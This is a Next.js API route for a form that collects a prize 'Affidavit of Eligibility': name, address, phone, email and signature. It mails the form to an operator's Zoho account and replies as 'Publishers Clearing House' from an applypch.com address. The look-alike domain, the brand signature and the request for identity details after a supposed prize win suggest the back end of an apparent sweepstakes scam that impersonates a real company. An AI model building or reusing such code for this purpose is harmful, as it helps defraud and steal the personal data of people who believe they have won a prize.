import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';
import { escapeHtml } from '@/lib/utils';

interface AffidavitPayload {
  winRef: string;
  prizeAwarded: string;
  applicationDate: string;
  fullName: string;
  addressStreet: string;
  addressCity: string;
  addressCountry: string;
  phone: string;
  email: string;
  signature: string;
  signDate: string;
  printName: string;
  electronicSignConfirm: boolean;
}

function str(v: unknown): string {
  return typeof v === 'string' ? v.trim() : '';
}

function validate(body: unknown): AffidavitPayload | null {
  if (!body || typeof body !== 'object') return null;
  const o = body as Record<string, unknown>;

  const payload: AffidavitPayload = {
    winRef: str(o.winRef),
    prizeAwarded: str(o.prizeAwarded),
    applicationDate: str(o.applicationDate),
    fullName: str(o.fullName),
    addressStreet: str(o.addressStreet),
    addressCity: str(o.addressCity),
    addressCountry: str(o.addressCountry),
    phone: str(o.phone),
    email: str(o.email),
    signature: str(o.signature),
    signDate: str(o.signDate),
    printName: str(o.printName),
    electronicSignConfirm: o.electronicSignConfirm === true,
  };

  const required = [
    payload.winRef,
    payload.prizeAwarded,
    payload.applicationDate,
    payload.fullName,
    payload.addressStreet,
    payload.addressCity,
    payload.addressCountry,
    payload.phone,
    payload.email,
    payload.signature,
    payload.signDate,
    payload.printName,
  ];

  if (required.some((v) => !v) || !payload.electronicSignConfirm) {
    return null;
  }

  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(payload.email)) {
    return null;
  }

  return payload;
}

function row(label: string, value: string) {
  return `<tr><td style="padding:6px 12px 6px 0;font-weight:600;vertical-align:top;color:#555;">${escapeHtml(label)}</td><td style="padding:6px 0;">${escapeHtml(value)}</td></tr>`;
}

export async function POST(request: NextRequest) {
  const parsed = validate(await request.json());
  if (!parsed) {
    return NextResponse.json(
      { error: 'Please complete every field, sign electronically, and confirm the agreement box.' },
      { status: 400 }
    );
  }

  const zohoUser = process.env.ZOHO_USER;
  const zohoPass = process.env.ZOHO_PASS;
  const toEmail = process.env.TO_EMAIL || zohoUser;

  if (!zohoUser || !zohoPass) {
    console.error('ZOHO_USER or ZOHO_PASS not configured');
    return NextResponse.json(
      { error: 'Submission is temporarily unavailable. Please try again later or email support@applypch.com.' },
      { status: 500 }
    );
  }

  const transporter = nodemailer.createTransport({
    host: 'smtp.zoho.com',
    port: 465,
    secure: true,
    auth: { user: zohoUser, pass: zohoPass },
  });

  const html = `
    <h2>Affidavit of Eligibility — Submitted Online</h2>
    <table style="border-collapse:collapse;font-size:14px;line-height:1.5;">
      ${row('Reference', parsed.winRef)}
      ${row('Prize awarded', parsed.prizeAwarded)}
      ${row('Application date', parsed.applicationDate)}
      ${row('Full name', parsed.fullName)}
      ${row('Street', parsed.addressStreet)}
      ${row('City / State / Postal', parsed.addressCity)}
      ${row('Country', parsed.addressCountry)}
      ${row('Phone', parsed.phone)}
      ${row('Email', parsed.email)}
      ${row('Electronic signature', parsed.signature)}
      ${row('Date signed', parsed.signDate)}
      ${row('Printed name', parsed.printName)}
    </table>
    <p style="margin-top:16px;color:#666;font-size:12px;">Submitted via applypch.com/documents/affidavit-of-eligibility.html</p>
  `;

  const text = [
    `Affidavit submitted — ${parsed.winRef}`,
    `Name: ${parsed.fullName}`,
    `Email: ${parsed.email}`,
    `Prize: ${parsed.prizeAwarded}`,
    `Signature: ${parsed.signature}`,
    `Date: ${parsed.signDate}`,
  ].join('\n');

  try {
    await transporter.sendMail({
      from: zohoUser,
      to: toEmail || zohoUser,
      replyTo: parsed.email,
      subject: `[PCH Affidavit] ${parsed.fullName} — ${parsed.winRef}`,
      text,
      html,
    });

    await transporter.sendMail({
      from: zohoUser,
      to: parsed.email,
      subject: `Affidavit received — ${parsed.winRef}`,
      html: `
        <p>Dear ${escapeHtml(parsed.fullName)},</p>
        <p>We have received your signed Affidavit of Eligibility for reference <strong>${escapeHtml(parsed.winRef)}</strong>.</p>
        <p>Our team will review it and contact you regarding the next steps for your prize.</p>
        <p>Publishers Clearing House<br>support@applypch.com</p>
      `,
      text: `We have received your Affidavit of Eligibility for ${parsed.winRef}. Our team will review it and contact you with next steps.`,
    });

    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error('Affidavit submit error:', err);
    return NextResponse.json(
      { error: 'Could not submit your affidavit. Please try again or email support@applypch.com.' },
      { status: 500 }
    );
  }
}
